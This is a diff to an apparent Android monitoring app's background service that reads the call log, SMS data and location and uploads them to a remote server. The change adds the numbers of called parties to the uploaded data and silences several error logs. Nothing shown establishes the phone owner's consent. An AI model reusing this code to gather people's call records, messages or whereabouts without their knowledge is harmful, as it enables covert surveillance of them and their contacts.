@@ -2,6 +2,7 @@ package app.mtproject;
 
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Calendar;
 import java.util.Date;
 import java.util.Timer;
 import java.util.TimerTask;
@@ -27,6 +28,8 @@ import android.os.IBinder;
 import android.os.SystemClock;
 import android.preference.PreferenceManager;
 import android.provider.CallLog;
+import android.text.format.DateFormat;
+import android.text.method.DateTimeKeyListener;
 import android.util.Log;
 
 public class LoggingService extends WakefulIntentService {
@@ -81,7 +84,7 @@ public class LoggingService extends WakefulIntentService {
 				Log.d(getClass().getSimpleName(), "Successfully retrieved user_id");
 				user_id = res;
 			} else {
-				Log.d(getClass().getSimpleName(), "Error retrieving user_id");
+				//Log.d(getClass().getSimpleName(), "Error retrieving user_id");
 			}
 		} catch (Exception e) {
 		}
@@ -91,7 +94,10 @@ public class LoggingService extends WakefulIntentService {
 		ArrayList<NameValuePair> postParameters = new ArrayList<NameValuePair>();
 		postParameters.add(new BasicNameValuePair("user_id", user_id));
 		postParameters.add(new BasicNameValuePair("date", date));
+		// We check that there'll be a date inserted in the DB, and thus a call.
 		Log.d(date, "Inserted date");
+		postParameters.add(new BasicNameValuePair("destination", destination));
+		Log.d(destination, "Inserted destination");
 		postParameters.add(new BasicNameValuePair("duration", duration));
 		postParameters.add(new BasicNameValuePair("type", type));
 		String response = null;
@@ -103,9 +109,9 @@ public class LoggingService extends WakefulIntentService {
 			String res = response.toString();
 			res = res.replaceAll("\\s+", "");
 			if (res.equals("1")) {
-				Log.d(getClass().getSimpleName(), "Insertado en DB!");
+				Log.d(getClass().getSimpleName(), "Calls data inserted");
 			} else {
-				Log.d(getClass().getSimpleName(), "Error insertando en la DB");
+				//Log.d(getClass().getSimpleName(), "Error inserting calls data");
 			}
 		} catch (Exception e) {
 		}
@@ -127,9 +133,9 @@ public class LoggingService extends WakefulIntentService {
 			String res = response.toString();
 			res = res.replaceAll("\\s+", "");
 			if (res.equals("1")) {
-				Log.d(getClass().getSimpleName(), "Insertado en DB!");
+				Log.d(getClass().getSimpleName(), "SMS data inserted");
 			} else {
-				Log.d(getClass().getSimpleName(), "Error insertando en la DB");
+				//Log.d(getClass().getSimpleName(), "Error inserting SMS data");
 			}
 		} catch (Exception e) {
 		}
@@ -140,8 +146,14 @@ public class LoggingService extends WakefulIntentService {
 		postParameters.add(new BasicNameValuePair("user_id", user_id));
 		postParameters.add(new BasicNameValuePair("latitude", latitude));
 		postParameters.add(new BasicNameValuePair("longitude", longitude));
+		//String date = DateFormat.getDateFormat(this).format(new Date());
+		Calendar calendar = Calendar.getInstance();
+		long date1 = calendar.getTimeInMillis() - calendar.getTimeZone().getDSTSavings();
+		String date = String.valueOf(date1);
+		postParameters.add(new BasicNameValuePair("date", date));
 		Log.d(latitude, "latitude");
 		Log.d(longitude, "longitude");
+		Log.d(date, "datetime");
 		String response = null;
 		StringBuilder str = new StringBuilder(serverAddress);
 		str.append("sendLocationData.php");
@@ -151,9 +163,9 @@ public class LoggingService extends WakefulIntentService {
 			String res = response.toString();
 			res = res.replaceAll("\\s+", "");
 			if (res.equals("1")) {
-				Log.d(getClass().getSimpleName(), "Insertado en DB!");
+				Log.d(getClass().getSimpleName(), "Location data inserted");
 			} else {
-				Log.d(getClass().getSimpleName(), "Error insertando en la DB");
+				Log.d(getClass().getSimpleName(), "Error inserting location data");
 			}
 		} catch (Exception e) {
 		}
@@ -161,8 +173,7 @@ public class LoggingService extends WakefulIntentService {
 
 	private void dumpCallsLog() {
 		ContentResolver cr = getContentResolver();
-		String columns[] = new String[] { CallLog.Calls.DATE,
-				CallLog.Calls.DURATION, CallLog.Calls.TYPE };
+		String columns[] = new String[] { CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.TYPE, CallLog.Calls.NUMBER };
 		Uri mContacts = CallLog.Calls.CONTENT_URI;
 		Cursor c = cr.query(mContacts, columns, // Which columns to return
 				null, // WHERE clause; which rows to return(all rows)
@@ -175,13 +186,12 @@ public class LoggingService extends WakefulIntentService {
 			do {
 				// date = c.getString(c.getColumnIndex(CallLog.Calls.DATE));
 				try {
-					date = create_datestring(c.getLong(c
-							.getColumnIndex(CallLog.Calls.DATE)));
+					date = create_datestring(c.getLong(c.getColumnIndex(CallLog.Calls.DATE)));
 				} catch (java.text.ParseException e) {
 					e.printStackTrace();
 				}
-				duration = c
-						.getString(c.getColumnIndex(CallLog.Calls.DURATION));
+				duration = c.getString(c.getColumnIndex(CallLog.Calls.DURATION));
+				destination = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
 				type = c.getString(c.getColumnIndex(CallLog.Calls.TYPE));
 			} while (c.moveToNext());
 		}
@@ -222,8 +232,7 @@ public class LoggingService extends WakefulIntentService {
 		return formatter.format(finalDate);
 	}
 
-	private static String create_datestring(String string)
-			throws java.text.ParseException {
+	private static String create_datestring(String string) throws java.text.ParseException {
 		android.os.Debug.waitForDebugger();
 		SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
 		String formattedDateString = sdf.format(string);
